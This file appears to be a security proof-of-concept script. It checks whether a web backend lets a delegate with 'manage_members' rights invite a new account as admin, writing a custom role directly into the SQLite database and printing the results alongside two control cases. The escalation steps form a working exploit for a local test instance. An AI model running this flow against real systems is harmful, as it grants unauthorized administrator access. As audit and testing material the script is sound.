"""Loop (a): a manage_members delegate invites an account as `admin`.

Usage (backend running against the given sqlite DB):
    python invite_escalation.py http://127.0.0.1:18431 /path/to/app.db [admin_email]

Signs up (first signup bootstraps the org) or logs in the org admin
(password Password123!), invites + registers a member, and gives that member a
custom "people-mgr" role (view_members + manage_members). Custom roles are
license-gated in the API, so that one Role + RoleAssignment row is written
straight into the sqlite DB. Then, as the delegate, invites a fresh email with
role=admin and accepts the invite, printing the status, the membership row
and the accepted user's rights. Controls: delegate -> member, admin -> admin.
"""
import json
import sqlite3
import sys
import uuid

import httpx

BASE, DB = sys.argv[1], sys.argv[2]
ADMIN = sys.argv[3] if len(sys.argv) > 3 else "loop-admin@example.com"
PW = "Password123!"
c = httpx.Client(base_url=BASE, timeout=30)
con = sqlite3.connect(DB)


def register(email, invite_token=None):
    body = {"name": email.split("@")[0], "email": email, "password": PW}
    if invite_token:
        body["invite_token"] = invite_token
    return c.post("/api/auth/register", json=body)


def login(email):
    r = c.post("/api/auth/jwt/login", data={"username": email, "password": PW})
    assert r.status_code == 200, r.text
    return r.json()["access_token"]


def h(tok, org=None):
    d = {"Authorization": f"Bearer {tok}"}
    if org:
        d["X-Organization-Id"] = org
    return d


def invite_token(email):
    row = con.execute("SELECT invite_token FROM memberships WHERE email=?", (email,)).fetchone()
    return row[0] if row else None


def perms(tok, org):
    orgs = c.get("/api/users/whoami", headers=h(tok)).json()["organizations"]
    mine = [o for o in orgs if o["id"] == org]
    return set(mine[0].get("permissions") or []) if mine else None


tag = uuid.uuid4().hex[:6]
register(ADMIN)
admin = login(ADMIN)
orgs = c.get("/api/users/whoami", headers=h(admin)).json()["organizations"]
if not orgs:
    assert c.post("/api/organizations", json={"name": "Loop Org"}, headers=h(admin)).status_code == 200
    orgs = c.get("/api/users/whoami", headers=h(admin)).json()["organizations"]
org = orgs[0]["id"]

mem_email = f"delegate-{tag}@example.com"
r = c.post(f"/api/organizations/{org}/members", json={"organization_id": org, "email": mem_email, "role": "member"},
           headers=h(admin, org))
assert r.status_code == 200, r.text
assert register(mem_email, invite_token(mem_email)).status_code == 201
delegate = login(mem_email)
delegate_id = c.get("/api/users/whoami", headers=h(delegate)).json()["id"]

role_id = str(uuid.uuid4())
con.execute("INSERT INTO roles (id, organization_id, name, permissions, is_system, created_at, updated_at) "
            "VALUES (?, ?, ?, ?, 0, datetime('now'), datetime('now'))",
            (role_id, org, f"people-mgr-{tag}", json.dumps(["view_members", "manage_members"])))
con.execute("INSERT INTO role_assignments (id, organization_id, role_id, principal_type, principal_id, created_at, updated_at) "
            "VALUES (?, ?, ?, 'user', ?, datetime('now'), datetime('now'))",
            (str(uuid.uuid4()), org, role_id, delegate_id))
con.commit()
print(f"delegate perms: {sorted(perms(delegate, org) & {'manage_members', 'full_admin_access'})}")

atk = f"attacker-{tag}@example.com"
r = c.post(f"/api/organizations/{org}/members", json={"organization_id": org, "email": atk, "role": "admin"},
           headers=h(delegate, org))
print(f"delegate POST /members role=admin -> {r.status_code} {r.text[:80]}")
row = con.execute("SELECT role FROM memberships WHERE organization_id=? AND email=?", (org, atk)).fetchone()
print(f"membership row for attacker: {row}")
tok = invite_token(atk)
if tok:
    register(atk, tok)
    p = perms(login(atk), org)
    print(f"attacker accepted invite -> full_admin_access={'full_admin_access' in (p or set())}")
denied = con.execute("SELECT action, details FROM audit_logs WHERE organization_id=? AND action LIKE 'member.invite%'",
                     (org,)).fetchall()
print(f"audit member.invite* rows: {denied[-1:] if denied else []}")

r = c.post(f"/api/organizations/{org}/members",
           json={"organization_id": org, "email": f"ok-{tag}@example.com", "role": "member"}, headers=h(delegate, org))
print(f"[control] delegate POST role=member -> {r.status_code}")
r = c.post(f"/api/organizations/{org}/members",
           json={"organization_id": org, "email": f"adm-{tag}@example.com", "role": "admin"}, headers=h(admin, org))
print(f"[control] admin POST role=admin -> {r.status_code}")
